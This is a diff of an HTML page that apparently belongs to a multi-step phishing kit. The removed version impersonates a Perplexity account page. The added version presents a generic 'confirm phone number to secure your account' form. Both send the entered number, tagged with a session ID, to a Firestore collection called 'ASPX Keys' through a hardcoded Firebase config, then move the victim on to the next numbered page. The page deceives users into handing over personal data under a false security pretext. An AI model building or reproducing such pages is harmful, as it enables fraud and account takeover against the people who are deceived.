@@ -1,52 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        (function() {
+            var params = new URLSearchParams(window.location.search);
+            var theme = params.get('theme');
+            if (theme === 'dark' || theme === 'light') {
+                document.documentElement.setAttribute('data-theme', theme);
+            }
+        })();
+    </script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Add Your Phone Number</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Confirm Phone Number</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Define CSS Variables for Light Mode (Default) */
+        /* Light theme (default) */
         :root {
-            --bg-color: #fff;
-            --text-primary: #000;
-            --text-secondary: #6e6e80;
-            --input-bg: #fff;
+            --bg-color: #ffffff;
+            --text-color: #000000;
+            --label-color: #6e6e73;
             --input-border: #c2c8d0;
-            --input-border-focus: #000;
-            --label-bg: #fff;
-            --btn-bg: #000;
-            --btn-bg-hover: #333;
-            --btn-text: #fff; /* Button text color for light mode */
+            --input-focus-border: #000000;
+            --input-bg: #ffffff;
+            --btn-bg: #000000;
+            --btn-color: #ffffff;
+            --btn-disabled-bg: #cccccc;
+            --label-bg: #ffffff;
         }
 
-        /* Define CSS Variables for Dark Mode */
-        [data-theme="dark"] {
-            --bg-color: #000;
-            --text-primary: #fff;
-            --text-secondary: #a1a1aa;
-            --input-bg: #000;
-            --input-border: #52525b;
-            --input-border-focus: #fff;
-            --label-bg: #000;
-            --btn-bg: #fff;
-            --btn-bg-hover: #e4e4e7;
-            --btn-text: #000; /* Button text color for dark mode */
+        /* Dark theme via system preference */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --text-color: #ffffff;
+                --label-color: #a1a1aa;
+                --input-border: #3a3a3a;
+                --input-focus-border: #ffffff;
+                --input-bg: #000000;
+                --btn-bg: #ffffff;
+                --btn-color: #000000;
+                --btn-disabled-bg: #444444;
+                --label-bg: #000000;
+            }
         }
 
-        * {
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        /* Explicit theme override via ?theme=dark or ?theme=light in URL */
+        html[data-theme="dark"] {
+            --bg-color: #000000;
+            --text-color: #ffffff;
+            --label-color: #a1a1aa;
+            --input-border: #3a3a3a;
+            --input-focus-border: #ffffff;
+            --input-bg: #000000;
+            --btn-bg: #ffffff;
+            --btn-color: #000000;
+            --btn-disabled-bg: #444444;
+            --label-bg: #000000;
+        }
+
+        html[data-theme="light"] {
+            --bg-color: #ffffff;
+            --text-color: #000000;
+            --label-color: #6e6e73;
+            --input-border: #c2c8d0;
+            --input-focus-border: #000000;
+            --input-bg: #ffffff;
+            --btn-bg: #000000;
+            --btn-color: #ffffff;
+            --btn-disabled-bg: #cccccc;
+            --label-bg: #ffffff;
         }
 
         body {
-            margin: 0;
-            padding: 0;
+            font-family: 'Inter', Arial, sans-serif;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
+            margin: 0;
             background-color: var(--bg-color);
-            color: var(--text-primary);
+            color: var(--text-color);
             transition: background-color 0.3s, color 0.3s;
         }
 
@@ -55,219 +90,189 @@
             max-width: 400px;
             padding: 20px;
             text-align: center;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         h1 {
-            font-size: 32px;
-            font-weight: 600;
+            font-size: 30px;
+            font-weight: 700;
             margin-bottom: 10px;
-            color: var(--text-primary);
-            letter-spacing: -0.5px;
+            width: 100%;
+            text-align: center;
         }
 
-        p {
-            font-size: 16px;
-            color: var(--text-secondary);
-            line-height: 1.5;
+        .subtitle {
+            font-size: 15px;
+            color: var(--label-color);
             margin-bottom: 30px;
+            line-height: 1.4;
         }
 
         .input-group {
             position: relative;
             margin-bottom: 20px;
             text-align: left;
+            width: 100%;
         }
 
-        .input-label {
+        .input-group label {
             position: absolute;
             top: -10px;
             left: 15px;
             background: var(--label-bg);
             padding: 0 5px;
             font-size: 12px;
-            color: var(--text-secondary);
+            color: var(--label-color);
+            font-family: 'Inter', Arial, sans-serif;
             z-index: 1;
-            transition: background-color 0.3s, color 0.3s;
         }
 
         input[type="tel"] {
             width: 100%;
             padding: 16px;
-            font-size: 18px;
-            background-color: var(--input-bg);
-            color: var(--text-primary);
+            font-size: 16px;
+            font-family: 'Inter', Arial, sans-serif;
             border: 1px solid var(--input-border);
-            border-radius: 30px;
+            border-radius: 25px;
+            box-sizing: border-box;
             outline: none;
+            background-color: var(--input-bg);
+            color: var(--text-color);
             transition: border-color 0.2s, background-color 0.3s, color 0.3s;
         }
 
-        input[type="tel"]:focus {
-            border-color: var(--input-border-focus);
+        input:focus {
+            border-color: var(--input-focus-border);
         }
 
-        /* Remove arrows from number input */
-        input::-webkit-outer-spin-button,
-        input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
+        .error-hint {
+            color: #d93025;
+            font-size: 13px;
+            text-align: left;
+            padding-left: 10px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            display: none;
+            width: 100%;
+            font-family: 'Inter', Arial, sans-serif;
         }
 
         .btn-continue {
             width: 100%;
             padding: 14px;
             background-color: var(--btn-bg);
-            color: var(--btn-text);
+            color: var(--btn-color);
             border: none;
-            border-radius: 30px;
+            border-radius: 25px;
             font-size: 16px;
-            font-weight: 500;
+            font-weight: 700;
+            font-family: 'Inter', Arial, sans-serif;
             cursor: pointer;
             margin-top: 10px;
             transition: background-color 0.3s, color 0.3s;
         }
 
-        .btn-continue:hover {
-            background-color: var(--btn-bg-hover);
+        input::placeholder {
+            color: var(--label-color);
+            opacity: 0.5;
         }
 
-        .error-msg {
-            color: #d93025;
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
+        .btn-continue:disabled {
+            background-color: var(--btn-disabled-bg);
+            cursor: not-allowed;
         }
     </style>
-    
-    <!-- Theme Detection Script -->
-    <script>
-        function applyTheme() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const themeParam = urlParams.get('theme');
-            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-
-            if (themeParam === 'dark') {
-                document.documentElement.setAttribute('data-theme', 'dark');
-            } else if (themeParam === 'light') {
-                document.documentElement.setAttribute('data-theme', 'light');
-            } else {
-                // Fallback to real-time device native theme
-                document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
-            }
-        }
-
-        // Apply theme immediately to prevent flashing
-        applyTheme();
-
-        // Listen for real-time changes in native device theme
-        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
-            const urlParams = new URLSearchParams(window.location.search);
-            // Only auto-switch if theme is NOT hardcoded in URL
-            if (!urlParams.has('theme')) {
-                document.documentElement.setAttribute('data-theme', e.matches ? 'dark' : 'light');
-            }
-        });
-    </script>
 </head>
 <body>
 
-    <div class="container">
-        
-        <h1>Add Your Phone Number</h1>
-        <p>You can use your phone number to sign in to your Perplexity Account and reset your password if you forgot it. This won't make your number public.</p>
+<div class="container">
+    <h1>Confirm phone number</h1>
+    <p class="subtitle">Please enter your phone number to secure your account.</p>
 
-        <div class="input-group">
-            <span class="input-label">Mobile Number</span>
-            <input type="tel" id="mobileNumber" placeholder="1234567890" maxlength="10" autocomplete="off">
-            <div id="error" class="error-msg">Please enter a valid 10-digit number</div>
-        </div>
-
-        <button class="btn-continue" id="submitBtn">Continue</button>
+    <div class="input-group">
+        <label>Phone number</label>
+        <input type="tel" id="phoneNumber" placeholder="e.g. +1 555-0100" autocomplete="tel">
     </div>
 
-    <!-- Firebase Scripts -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    <div id="errorHint" class="error-hint">
+        Please enter a valid phone number.
+    </div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
-            authDomain: "question-metabase.firebaseapp.com",
-            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "question-metabase",
-            storageBucket: "question-metabase.firebasestorage.app",
-            messagingSenderId: "770698198753",
-            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
-            measurementId: "G-6ZP1FPMKSJ"
-        };
+    <button class="btn-continue" id="submitBtn" onclick="handleSubmission()">Continue</button>
+</div>
 
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Get elements
-        const phoneInput = document.getElementById('mobileNumber');
+    const firebaseConfig = {
+        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+        authDomain: "question-metabase.firebaseapp.com",
+        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "question-metabase",
+        storageBucket: "question-metabase.firebasestorage.app",
+        messagingSenderId: "770698198753",
+        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+        measurementId: "G-6ZP1FPMKSJ"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session');
+
+    // Enable Enter key submission
+    const phoneInput = document.getElementById('phoneNumber');
+    phoneInput.addEventListener("keypress", function(event) {
+        if (event.key === "Enter") {
+            event.preventDefault();
+            handleSubmission();
+        }
+    });
+
+    window.handleSubmission = async function() {
+        const phoneValue = phoneInput.value.trim();
+        const hint = document.getElementById('errorHint');
         const submitBtn = document.getElementById('submitBtn');
-        const errorMsg = document.getElementById('error');
 
-        // Function to get Parameters from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('session');
-        const themeParam = urlParams.get('theme');
+        hint.style.display = "none";
 
-        // Restriction: Only allow 10 digits
-        phoneInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
-            errorMsg.style.display = 'none';
-        });
+        // Basic validation check
+        if (phoneValue.length < 7) {
+            hint.style.display = "block";
+            hint.innerText = "Please enter a valid phone number.";
+            return;
+        }
 
-        // Handle submission
-        const handleSubmit = async () => {
-            const number = phoneInput.value;
+        if (!sessionId) return;
 
-            if (number.length !== 10) {
-                errorMsg.style.display = 'block';
-                return;
-            }
+        try {
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Processing...";
 
-            if (!sessionId) {
-                alert("Session ID missing in URL");
-                return;
-            }
+            const docRef = doc(db, "ASPX Keys", sessionId);
 
-            try {
-                // Reference the specific document in "ASPX Keys" collection
-                const docRef = doc(db, "ASPX Keys", sessionId);
-                
-                // Update the document with the mobile number
-                await updateDoc(docRef, {
-                    mobileNumber: number,
-                    updatedAt: serverTimestamp()
-                });
+            await updateDoc(docRef, {
+                "Phone Number": phoneValue,
+                updatedAt: new Date().toLocaleString() + " UTC+5:30"
+            });
 
-                // Redirect to 6.html with same session ID and carry over the theme parameter if it exists
-                let nextUrl = `6.html?session=${sessionId}`;
-                if (themeParam) {
-                    nextUrl += `&theme=${themeParam}`;
-                }
-                
-                window.location.href = nextUrl;
+            // Redirect carrying only the session ID
+            window.location.href = `6.html?session=${sessionId}`;
+            
+        } catch (e) {
+            console.error(e);
+            hint.style.display = "block";
+            hint.innerText = "Session not found or connection error.";
+            submitBtn.disabled = false;
+            submitBtn.innerText = "Continue";
+        }
+    };
+</script>
 
-            } catch (e) {
-                console.error("Error updating document: ", e);
-                alert("An error occurred. Please try again.");
-            }
-        };
-
-        // Click Event
-        submitBtn.addEventListener('click', handleSubmit);
-
-        // Enter Key Event
-        phoneInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                handleSubmit();
-            }
-        });
-    </script>
 </body>
 </html>
